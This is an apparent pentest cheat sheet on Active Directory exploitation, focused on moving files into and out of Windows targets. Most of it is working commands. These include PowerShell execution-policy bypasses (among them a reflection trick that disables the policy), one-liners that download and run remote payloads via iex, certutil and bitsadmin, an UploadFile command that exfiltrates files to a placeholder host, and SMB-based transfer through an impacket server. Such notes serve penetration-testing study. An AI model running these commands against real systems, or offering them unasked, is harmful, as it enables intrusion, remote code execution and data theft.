
# Active Directory Exploitation: File Transfer and Exfiltration, Execution

---

[Back to Table of Contents](../cysec)

># Overview
 - File transfer
 - File/script execution
 - File transfer using SMB
 - File transfer using external tools & static binaries
 - Resources

---

# File download, native commands:

### Powershell 
Binary or script execution via powershell is crucial to exploitation of AD environments, as is the ability to 
transfer files to the target machine. 
Below are various methods of powershell execution, including methods of policy bypass, execution without writing to disk,
piping, and so on.

```powershell
Get-ExecutionPolicy
```
Enabling powershell
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

Using Powershell's Invoke- commands:
```powershell
Get-Content .file_to_execute.ps1 | Invoke-Expression

GC .file_to_execute.ps1 | iex

PowerShell.exe -ExecutionPolicy Bypass -File .file_to_execute.ps1

PowerShell.exe -ExecutionPolicy UnRestricted -File .file_to_execute.ps1

Set-ExecutionPolicy Bypass -Scope Process

Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted

HKEY_CURRENT_USERSoftwareMicrosoftPowerShell1ShellIdsMicrosoft.PowerShell

function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}  Disable-ExecutionPolicy  .file_to_execute.ps1
```

Bypassing policy via piping commands:
```powershell
Echo Write-Host "script" | PowerShell.exe -noprofile -

Get-Content .file_to_execute.ps1 | PowerShell.exe -noprofile -
```
Using type -- basically the Windows equivalent of cat:
```powershell
type .runme.ps1 | PowerShell.exe -noprofile - 
```
Downloading and executing payloads from remotely hosted servers:
```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://ip/payload.ps1')"

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://ip/payload.exe', 'payload.exe')
```
Upload/Exfiltration of files using powershell:
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://ip/file_to_extract.txt', 'file_to_extract.txt')
```
Powershell: Command
 - Can be written as -command or simply -c
```powershell
Powershell -command "script_content"
```
Combining the methods:
```powershell
powershell -executionpolicy bypass IEX(New-Object Net.WebClient).downloadString('http://ip/payload.ps1')
```
---

Other methods of file transfer also exist within the context of a default AD/Windows environment.

### certutil.exe
```powershell
certutil.exe -urlcache -split -f http://ip/payload.exe payload.exe
```
### wget & curl
wget and curl are sometimes available on Windows machines and can be used just as on Linux, however 
they are not always available. 

### bitsadmin.exe
```powershell
bitsadmin.exe /transfer mydownloadjob /download /priority high http://ip/payload.exe payload.exe
```
----
# SMB
SMB is an extremely useful method of file transfer for both Windows and Linux targets.

One of the strongest advantages of smb is the ability to run payloads without the files ever touching 
the disk while also not using http methods of download, which may be blocked or heavily filtered. 

Within the impacket toolbox is an extremely useful smb server script which allows for quick, simple, and seamless
initialization of an smb server. 

```
impacket-smbserver share_name $(pwd) -smb2support -user username -password password
```
Logging into the smb server from the target machine can be done simply via powershell or evil-winrm:
```powershell   
$pass = convertto-securestring 'password' -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential('username', $pass);
New-PSDrive -Name username -PSProvider FileSystem -Credential $cred -Root \\ip\share_name;
```
The share can be viewed just as any other directory on Windows using dir:
```powershell
dir \\ip\share_name
```
Upload/Download of files from the share:
```powershell
copy \\ip\share_name\file_to_extract.txt file_to_extract.txt
```
```powershell
copy file_to_extract.txt \\ip\share_name\file_to_extract.txt
```
---

# Other Methods
 - ftp
 - tftp
 - mshta
 - rundll32
 - php
 - socat
 - netcat

## Useful resources:

https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/

https://github.com/milkdevil/UltimateAppLockerByPassList

https://github.com/740i/pentest-notes/blob/master/filetransfers.md

https://guide.offsecnewbie.com/transferring-files

https://ppn.snovvcrash.rocks/pentest/infrastructure/file-transfer

https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65

https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration